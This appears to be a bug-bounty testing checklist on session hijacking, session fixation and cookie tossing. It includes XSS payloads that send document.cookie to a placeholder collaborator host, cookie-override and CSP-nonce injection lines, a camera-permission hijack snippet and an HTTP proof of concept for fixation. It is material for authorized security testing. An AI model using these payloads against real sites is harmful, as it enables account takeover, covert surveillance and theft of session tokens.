# Session Hijacking, Fixation & Cookie Tossing

**What it is:** Taking over a victim's authenticated session by stealing, planting, or overriding their session token. Distinct from `06-session-management.md` (that = config hygiene; this = active takeover techniques). Hijacking = steal token **after** login. Fixation = plant a known token **before** login.

## Token theft vectors (steal after login)
- [ ] **XSS → cookie exfil** (only if not `HttpOnly`):
```javascript
fetch('https://COLLAB/c?'+document.cookie)          // classic
new Image().src='https://COLLAB/?'+document.cookie
```
- [ ] **Token in URL** → leaks via `Referer`, browser history, logs, proxies.
- [ ] **Referer leak** of session/reset/OAuth tokens to third-party resources (weak `Referrer-Policy`).
- [ ] **Network sniff** (no HSTS / mixed content / HTTP subdomain).
- [ ] **CORS misconfig** → read `/me` cross-origin with credentials (`05-client-side/02`).
- [ ] **Cache deception** → victim's authenticated page cached, attacker fetches it (`10-server-edge/03`).
- [ ] **Request smuggling** → capture the next user's request incl. `Cookie` (`10-server-edge/02`).
- [ ] **Cross-Site WebSocket Hijacking (CSWSH)** → WS handshake with no `Origin` check + cookie auth; attacker page opens the socket and reads/acts as victim.

## Session fixation (plant a token before login)
Attack flow:
1. Attacker obtains a valid pre-auth session ID from the app.
2. Forces it onto the victim (URL param `;jsessionid=`, a `Set-Cookie` via subdomain/XSS/meta, or a login link).
3. Victim logs in; if the app **does not rotate** the session ID on auth, the attacker's known ID is now authenticated.
4. Attacker uses the same ID → logged in as victim.

Test:
- [ ] Note session cookie **before** login, log in, check if it **changed**. Same value = fixation.
- [ ] Can you set the session cookie via URL/param, or via a subdomain you control (cookie tossing below)?
- [ ] Is a pre-auth cookie honored post-auth?

## Cookie tossing (subdomain → parent-domain override)
Any subdomain (incl. a low-value/XSS-able/taken-over one) can write a cookie for the **parent registrable domain**:
```javascript
document.cookie = "session=ATTACKER_VALUE; domain=.target.com; path=/";
```
Uses:
- [ ] **Fixation via subdomain**: set the parent `session`/`csrf` cookie from `sub.target.com`.
- [ ] **Escalate subdomain XSS → main-domain impact**: overwrite parent cookies, force login-CSRF, or shadow a security cookie.
- [ ] **Override the CSRF token** cookie so your forged form matches (defeats double-submit CSRF).
- [ ] **`__Host-`/`__Secure-` bypass attempts**: those prefixes resist subdomain override — but a non-prefixed duplicate can still confuse the app if it reads the wrong one.
- [ ] **Cookie-jar overflow eviction**: set many large cookies from a subdomain to evict/replace the victim's real session cookie (browser per-domain cookie cap), forcing a fixation/DoS.

### Cookie XSS + tossing chain (Zoom-class, real writeup)
1. Post-based XSS on a low-security subdomain (unexploitable alone).
2. App reflects a **cookie value into the CSP `nonce`** unescaped:
```
Cookie: _zm_csp_script_nonce="x' 'nonce-x' >alert(1)// "
```
   → your `nonce-x` script runs across ~40 inline scripts on the **main** domain.
3. Cookie tossing plants that malicious nonce cookie for `.target.com` from the subdomain.
4. Persistent XSS on nearly every main-domain page (CSP re-processes it each load).
5. **OAuth "dirty dancing"**: change the flow so the `code` lands in the URL **fragment** (not sent to server, stays unconsumed); XSS reads it via `window.opener.document.location`; replay `code` + captured cookies → session token.
6. **Permission hijack**: pre-granted camera/mic silently reused:
```javascript
navigator.permissions.query({name:"camera"}).then(r=>{ if(r.state==="granted")
  navigator.mediaDevices.getUserMedia({video:true}).then(exfil); });
```
7. **Self-healing**: persistent cookie XSS replays if the session expires.

### WAF weaponization via cookie tossing (DoS)
```javascript
document.cookie="x=<script>; domain=.target.com; path=/account/password"
```
The WAF sees a "malicious" script tag in every request and **blocks the victim** from that path (targeted account-level DoS).

## Session puzzling / variable overloading
- [ ] A session var set in one flow (e.g. password-reset "verified email") is trusted by an unrelated flow → auth bypass. Map which endpoints set/read the same session keys.

## Post-hijack persistence checks
- [ ] Does logout / password change invalidate the stolen token? (If not → durable hijack; see `06-session-management.md`.)

## 🎯 PoC — Request → Response (fixation: session ID not rotated on login)

Pre-auth cookie:
```http
GET /login HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Set-Cookie: SESSIONID=AAAA1111; Path=/            ← note this value
```
Log in with that same cookie:
```http
POST /login HTTP/2
Host: target.com
Cookie: SESSIONID=AAAA1111
Content-Type: application/x-www-form-urlencoded

username=victim&password=correct
```
```http
HTTP/2 302 Found
Location: /dashboard
# NO new Set-Cookie                                ← same ID now authenticated = fixation
```
Attacker who planted `AAAA1111` on the victim (URL/subdomain cookie tossing) now shares the authenticated session.

## Detection
- [ ] Burp **Sequencer**: capture 200+ tokens, entropy < 64 bits = predictable/stealable.
- [ ] Check cookie flags (`HttpOnly`, `Secure`, `SameSite`, `Domain`, `__Host-`).
- [ ] Test session rotation on login and privilege change.
- [ ] Enumerate subdomains you can set cookies from (cookie-tossing surface).

## Impact
Full account takeover, persistent surveillance, CSRF-defense bypass, targeted DoS.

## Report notes
Demonstrate takeover of a victim account you control end-to-end. For cookie tossing, show the subdomain setting the parent cookie and the resulting main-domain effect. For fixation, show the un-rotated ID authenticated.

## Deep cuts — more theft/plant primitives
- [ ] **Subdomain takeover → cookie plant:** a dangling subdomain you claim (`08-infra/01`) can `Set-Cookie; domain=.target.com` → fixation/CSRF-token override on the apex, no XSS needed.
- [ ] **Token in `localStorage`/JS memory:** any XSS (even non-`HttpOnly`-relevant) reads `localStorage.token`/IndexedDB/`window.__STATE__` → exfil bearer token. SPAs storing JWTs client-side are one XSS from full ATO.
- [ ] **`Set-Cookie` via CRLF / header injection** (`03-injection/07`) or via cache poisoning (`08-infra/03`) → plant a session cookie into the victim's response.
- [ ] **bfcache / back-forward + logout:** after "logout", the page restored from bfcache still holds tokens/authed state in memory → act as the prior user.
- [ ] **OAuth-popup clickjacking → code theft:** frame the consent/callback (`05-client-side/03`) to leak the `code` ("dirty dancing" adjacent, `04-oauth-sso`).
- [ ] **Session-puzzling map:** enumerate every endpoint that *writes* a session key (reset "email verified", cart "owner", impersonation) and every one that *reads* it — a key set in a low-trust flow trusted by a high-trust flow = bypass.
- [ ] **`SameSite` reality check:** `Lax` still sends on top-level GET navigations (GET-based state changes = CSRF), `None` needs `Secure`; a 2-min "Lax+POST" grace window on fresh cookies (Chrome) enables some cross-site POSTs.
- [ ] **TLS/Referrer downgrade:** missing HSTS + an HTTP subdomain, or `Referrer-Policy: unsafe-url`, leaks tokens on-the-wire / via Referer.

## Sources
- Harel/nokline "Zoom Session Takeover" ($15k) — cookie tossing, cookie-nonce XSS, OAuth dirty dancing, permission hijack, WAF-DoS.
- Session fixation (OWASP / bugbountypoc); therceman "Session Hijack via Chained Attack".
